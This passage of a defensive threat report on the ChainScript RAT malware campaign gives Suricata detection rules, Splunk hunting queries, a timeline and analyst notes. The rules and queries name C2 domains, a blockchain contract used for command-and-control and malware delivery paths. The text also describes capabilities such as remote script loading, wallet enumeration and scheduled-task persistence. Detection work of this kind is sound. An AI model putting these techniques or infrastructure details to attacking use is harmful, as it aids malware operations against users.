alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE ChainScript EtherHiding - eth_call to Polygon Contract 0xf9099d0d7473"; flow:established,to_server; http.method; content:"POST"; http.request_body; content:"eth_call"; content:"0x4ab7874e"; distance:0; content:"0xf9099d0d747368cce8C10226CC9AF2bFD4DDbCF4"; nocase; distance:0; classtype:trojan-activity; sid:9100002; rev:2;)
```

<!-- audit: SURI-2 -- distance:0 ensures ordered matching within http.request_body without re-declaring the buffer. Advisory-specific; unique contract address eliminates FP. -->

---

#### SURI-3: MSI Delivery Gate (SID 9100003)

Detects the token-gated MSI delivery URI pattern (`/capher.php?token=`) used by the ClickFix campaign.

**Status:** compile ✅ compiles · confidence: high  

```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE ChainScript RAT - MSI Delivery Gate capher.php"; flow:established,to_server; http.method; content:"GET"; http.uri; content:"/capher.php?token="; classtype:trojan-activity; sid:9100003; rev:1;)
```

---

#### SURI-4: Remote Script Pull (SID 9100004)

Detects HTTP GET requests to `/api/agent/script` on C2 ports with `X-Agent-Token`, the extensibility endpoint used by ChainScript to load remote JavaScript modules. (Note: the `/api/agent/script` endpoint is inferred from the Justice-Hammer analysis of the `download_run` and `extraCommands` handler code paths, which reference an HTTP GET to this path on the C2 panel for fetching ad-hoc scripts. It is not explicitly named in the Blackpoint blog narrative.)

**Status:** compile ✅ compiles · confidence: medium  

```
alert http $HOME_NET any -> $EXTERNAL_NET [3847,3851,3854] (msg:"MALWARE ChainScript RAT - Remote Script Pull /api/agent/script"; flow:established,to_server; http.method; content:"GET"; http.uri; content:"/api/agent/script"; http.header_names; content:"X-Agent-Token"; classtype:trojan-activity; sid:9100004; rev:2;)
```

---

#### SURI-5 through SURI-10: Known C2 Domain DNS Queries (SIDs 9100005-9100010)

Six DNS-based rules detecting queries for known ChainScript C2 domains: `shift-api-control[.]com`, `bedotiq[.]net`, `api-configuard[.]com`, `kerosand[.]net`, `moweros[.]net`, `giperon[.]net`.

**Status:** compile ✅ compiles · confidence: high  

```
alert dns $HOME_NET any -> any any (msg:"MALWARE ChainScript RAT - Known C2 Domain shift-api-control.com"; dns.query; content:"shift-api-control.com"; nocase; classtype:trojan-activity; sid:9100005; rev:1;)

alert dns $HOME_NET any -> any any (msg:"MALWARE ChainScript RAT - Known C2 Domain bedotiq.net"; dns.query; content:"bedotiq.net"; nocase; classtype:trojan-activity; sid:9100006; rev:1;)

alert dns $HOME_NET any -> any any (msg:"MALWARE ChainScript RAT - Known C2 Domain api-configuard.com"; dns.query; content:"api-configuard.com"; nocase; classtype:trojan-activity; sid:9100007; rev:1;)

alert dns $HOME_NET any -> any any (msg:"MALWARE ChainScript RAT - Known C2 Domain kerosand.net"; dns.query; content:"kerosand.net"; nocase; classtype:trojan-activity; sid:9100008; rev:1;)

alert dns $HOME_NET any -> any any (msg:"MALWARE ChainScript RAT - Known C2 Domain moweros.net"; dns.query; content:"moweros.net"; nocase; classtype:trojan-activity; sid:9100009; rev:1;)

alert dns $HOME_NET any -> any any (msg:"MALWARE ChainScript RAT - Known C2 Domain giperon.net"; dns.query; content:"giperon.net"; nocase; classtype:trojan-activity; sid:9100010; rev:1;)
```

<!-- audit: SURI-5-10 -- IOC-based DNS rules; short shelf life as domains rotate. Deploy alongside behavioral rules. moweros.net and giperon.net added per critic review (were listed as IOCs but lacked DNS rules). -->

---

## Hunting Queries

### Splunk -- Node.js in Suspicious Microsoft Directories

```spl
index=sysmon EventCode=1 Image="*\\node.exe"
| where match(Image, "(?i)\\\\Microsoft\\\\Windows\\\\(Libraries|Themes|INetCache|Shell)\\\\")
| stats count by Computer, Image, ParentImage, CommandLine
```

### Splunk -- EtherHiding RPC Traffic

```spl
index=proxy OR index=network
| where match(_raw, "eth_call") AND match(_raw, "0x4ab7874e")
| stats count by src_ip, dest_ip, dest_port, uri
```

### Splunk -- Scheduled Task Registration by Node.js

```spl
index=sysmon EventCode=1 ParentImage="*\\node.exe" Image="*\\powershell.exe"
  CommandLine="*Register-ScheduledTask*"
| stats count by Computer, CommandLine, ParentCommandLine
```

---

## Timeline

| Date | Event |
|------|-------|
| 2026-08-21 | .NET helpers compiled (21:17:54 UTC) |
| 2026-08-24 11:20:09 UTC | Polygon contract deployed (block 92576921) |
| 2026-08-24 11:20:32 UTC | MSI build timestamp (23 seconds after contract) |
| 2026-08-24 ~17:31 UTC | Reserve domain batch registration (moweros, bedotiq) |
| 2026-08-27 | First wire observation (public sandbox detonation) |
| 2026-08-28 | Initial disclosure published |
| 2026-08-31 16:xx UTC | First setPanelUrl rotation to moweros[.]net:3851 |
| 2026-08-31 16:16 UTC | Second rotation to bedotiq[.]net:3854 |
| 2026-09-02 | Suricata rules revised post-rotation |
| 2026-09-21 | Public reporting by THN, Security Affairs, Hackread |

---

## Related Campaigns

**PasteSwitch Operation** (mid-September 2026): Compromised HBO Max Reddit account `u/hbomax` delivered 108 malicious ads over 48 hours using ClickFix techniques. Windows payloads included Amatera Stealer, AnimateClipper, ZigClipper. macOS payloads included MacSync, AMOS, fake crypto wallets. Documented by [Hudson Rock](https://www.hudsonrock.com/blog/hbo-max-ads-on-a-compromised-reddit-account-exposed-a-massive-pasteswitch-clickfix-operation/) and [ADAMnetworks](https://adamnet.works/blog/hbo-max-ads-exposed-the-pasteswitch-clickfix-operation/).

**Related malware families** using similar EtherHiding/blockchain C2 patterns: Tsundere, EtherRAT.

---

## Notes for Review

- **Polymorphism:** Scattered folder names rotate per build; the layout shape (node.exe + node_modules + app\src\index.js in OS directories) is the durable indicator, not specific paths.
- **Sandbox evasion:** Initial sandbox score was 3/100 (clean); zero YARA/Sigma/Suricata hits at submission time. No VM/sandbox/geolocation detection observed (T1497 absent).
- **Wallet enumeration is presence-only:** ~37 desktop wallets and ~48 browser extensions checked for existence; no direct seed/key extraction observed in analyzed build. However, the `eval` and remote script loading capabilities could enable this in future variants.
- **MSI uninstall does not clean up:** Uninstalling the MSI via Windows does NOT remove scattered payload, scheduled task, or registry fallback -- only the `kill` command from the C2 operator performs full cleanup.
- **HTTPS limitation:** Snort/Suricata rules for EtherHiding eth_call traffic are effective only on cleartext HTTP; HTTPS to blockchain RPCs requires TLS inspection. DNS rules for C2 domains remain effective regardless.
